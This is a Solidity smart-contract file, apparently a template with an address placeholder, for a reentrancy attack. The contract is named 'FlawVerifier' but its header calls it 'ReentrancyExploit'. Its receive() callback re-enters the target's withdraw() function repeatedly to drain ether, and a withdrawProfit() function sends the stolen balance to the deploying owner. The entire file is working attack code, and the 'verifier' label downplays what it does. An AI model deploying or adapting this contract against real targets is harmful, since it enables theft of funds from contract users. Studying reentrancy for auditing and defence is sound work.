// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title ReentrancyExploit
 * @notice Exploits reentrancy vulnerability
 * @dev Target: {{CONTRACT_ADDRESS}}
 */

interface IVulnerableContract {
    function withdraw() external;
    function deposit() external payable;
    function getBalance(address user) external view returns (uint256);
}

contract FlawVerifier {
    IVulnerableContract public target;
    address public owner;
    uint256 public initialBalance;
    uint256 public finalBalance;
    uint256 public attackCount;
    uint256 public maxAttacks = 5;

    constructor(address _target) {
        target = IVulnerableContract({{CONTRACT_ADDRESS}});
        owner = msg.sender;
    }

    /**
     * @notice Execute reentrancy exploit
     * @return True if exploit succeeds
     */
    function verify() external payable returns (bool) {
        initialBalance = address(this).balance;

        // Step 1: Deposit funds to establish balance
        target.deposit{value: msg.value}();

        // Step 2: Trigger reentrancy by withdrawing
        attackCount = 0;
        target.withdraw();

        finalBalance = address(this).balance;

        // Exploit succeeds if we gained more than we deposited
        return finalBalance > initialBalance;
    }

    /**
     * @notice Reentrancy callback - called when target sends ETH
     */
    receive() external payable {
        // Reenter if we haven't exceeded max attacks and target has balance
        if (attackCount < maxAttacks && address(target).balance >= 1 ether) {
            attackCount++;
            target.withdraw();
        }
    }

    function getProfit() external view returns (uint256) {
        if (finalBalance > initialBalance) {
            return finalBalance - initialBalance;
        }
        return 0;
    }

    function withdrawProfit() external {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }
}
